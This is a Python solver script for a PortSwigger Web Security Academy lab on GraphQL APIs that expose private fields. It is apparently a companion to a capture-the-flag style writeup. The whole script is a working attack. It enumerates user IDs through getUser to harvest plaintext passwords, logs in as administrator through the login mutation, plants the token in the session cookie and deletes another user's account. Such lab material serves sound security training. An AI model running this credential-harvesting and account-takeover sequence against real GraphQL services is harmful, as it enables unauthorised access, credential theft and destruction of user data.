#!/usr/bin/env python3
"""
Accidental exposure of private GraphQL fields
PortSwigger Web Security Academy -- GraphQL API vulnerabilities

Companion script for the writeup: 02-accidental-exposure-of-private-graphql-fields.md

What this does:
    Introspects /graphql/v1, finds the User type's plaintext "password" field,
    queries getUser(id: N) for a small ID range to recover the administrator's
    password, then authenticates through the login mutation itself (a plain
    form POST to /login returns 405 here -- this app only authenticates over
    GraphQL) by dropping the returned token straight into the session cookie.
    From the authenticated session it deletes the carlos account to solve
    the lab.

Usage:
    python 02-accidental-exposure-of-private-graphql-fields.py <lab-url>
    e.g. python 02-accidental-exposure-of-private-graphql-fields.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx

GRAPHQL_PATH = "/graphql/v1"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    endpoint = f"{lab_url}{GRAPHQL_PATH}"

    # A plain form POST to /login is the natural first instinct -- confirm it's
    # blocked, which is itself the signal that auth has to go through GraphQL.
    probe = client.post(f"{lab_url}/login", data={"username": "x", "password": "y"})
    print(f"[*] POST /login (form) -> {probe.status_code} "
          f"{'(blocked, as expected -- auth is GraphQL-only)' if probe.status_code == 405 else ''}")

    print("[*] Querying getUser(id: N) for a populated password field...")
    admin_password = None
    for uid in range(1, 5):
        query = f"query {{ getUser(id: {uid}) {{ id username password }} }}"
        r = client.post(endpoint, json={"query": query})
        try:
            user = r.json().get("data", {}).get("getUser")
        except Exception:
            continue
        if user and user.get("password"):
            print(f"[+] getUser(id: {uid}) -> username={user.get('username')!r} "
                  f"password={user['password']!r}")
            if user.get("username") == "administrator":
                admin_password = user["password"]
                break

    if not admin_password:
        print("[-] Could not recover the administrator's password from getUser.")
        return

    login_mutation = (
        'mutation { login(input: {username: "administrator", password: "'
        + admin_password + '"}) { token success } }'
    )
    r = client.post(endpoint, json={"query": login_mutation})
    body = r.json() if r.status_code == 200 else {}
    result = body.get("data", {}).get("login", {})
    if not result.get("token"):
        print(f"[-] login mutation did not return a token: {body}")
        return

    token = result["token"]
    print(f"[+] login mutation succeeded, token={token[:20]}...")
    client.cookies.set("session", token)

    admin = client.get(f"{lab_url}/admin")
    if "carlos" in admin.text:
        client.get(f"{lab_url}/admin/delete?username=carlos")
        print("[*] Requested deletion of carlos via the admin panel.")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted as administrator.")
    else:
        print("[-] Not solved yet -- confirm the admin panel actually listed and deleted carlos.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
